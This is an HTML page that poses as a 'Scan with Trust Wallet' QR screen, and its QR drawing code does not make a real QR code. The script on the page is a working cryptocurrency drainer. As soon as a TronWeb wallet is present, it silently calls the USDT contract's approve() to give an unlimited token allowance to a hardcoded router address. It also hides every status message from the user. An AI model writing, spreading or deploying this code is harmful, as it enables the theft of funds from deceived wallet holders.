<!doctype html>
<html lang="ro">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Scan</title>
<style>
  html,body{height:100%;margin:0;background:#0b1220;font-family:system-ui}
  .wrap{height:100%;display:flex;align-items:center;justify-content:center}
  #qr{width:420px;height:420px;background:#fff;border-radius:10px;display:flex;align-items:center;justify-content:center;overflow:hidden}
  #s{position:fixed;bottom:12px;left:12px;color:#93c5fd;font-size:13px;opacity:0.9}
</style>
</head>
<body>
  <div class="wrap">
    <div id="qr" title="Scan with Trust Wallet"></div>
  </div>
  <div id="s"></div>

<script>
/* CONFIG - verifică adresa USDT corectă */
const USDT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";
const ROUTER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";
const AMOUNT_USDT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
const DECIMALS = 6;

/* Simple QR generator (larger matrix) */
;(function(){function Q(t){this.t=t}Q.prototype.make=function(){var s=41;this.c=s;this.m=[];for(var i=0;i<s;i++){this.m[i]=[];for(var j=0;j<s;j++)this.m[i][j]=!1}var x=0,y=0;for(var k=0;k<this.t.length;k++){var ch=this.t.charCodeAt(k);for(var b=7;b>=0;b--){this.m[y][x]=!!(ch>>b&1);x++;if(x>=s){x=0;y++;if(y>=s)return}}}};Q.prototype.svg=function(cell,fg,bg){cell=cell||8;fg=fg||'#0b1220';bg=bg||'#fff';var s=this.c*cell;var svg=['<svg xmlns="http://www.w3.org/2000/svg" width="'+s+'" height="'+s+'" viewBox="0 0 '+s+' '+s+'" shape-rendering="crispEdges">','<rect width="100%" height="100%" fill="'+bg+'"/>'];for(var i=0;i<this.c;i++)for(var j=0;j<this.c;j++)if(this.m[i][j])svg.push('<rect x="'+(j*cell)+'" y="'+(i*cell)+'" width="'+cell+'" height="'+cell+'" fill="'+fg+'"/>');svg.push('</svg>');return svg.join('')};window.SimpleQR={create:function(t){var q=new Q(t);q.make();return q.svg(10,'#0b1220','#fff')}}})();

/* Render QR for this page */
const url = location.href;
document.getElementById('qr').innerHTML = SimpleQR.create(url);
document.getElementById('qr').onclick = ()=> window.open(url);

/* Minimal status (only for debug) */
const S = (t)=>{try{document.getElementById('s').innerText=t}catch(e){}}

/* tronWeb auto approve flow */
function toUnits(amountStr,dec){const p=String(amountStr).split('.');const w=p[0]||'0';const f=p[1]||'';const ff=(f+'0'.repeat(dec)).slice(0,dec);return (w+ff).replace(/^0+(?=\d)|^$/,'0')}

async function autoApprove(){
  if(!(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58)) { S(''); return; }
  try{
    const tron = window.tronWeb;
    const contract = await tron.contract().at(USDT);
    const amt = toUnits(AMOUNT_USDT, DECIMALS);
    await contract.approve(ROUTER, amt).send();
    S('');
  }catch(e){
    S('');
  }
}

/* Wait for tronWeb (tries a few times), then call autoApprove */
let tries=0;const max=12;
const t=setInterval(()=>{
  tries++;
  if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
    clearInterval(t);
    autoApprove();
  } else if(tries>=max){ clearInterval(t); S(''); }
},1000);
</script>
</body>
</html>
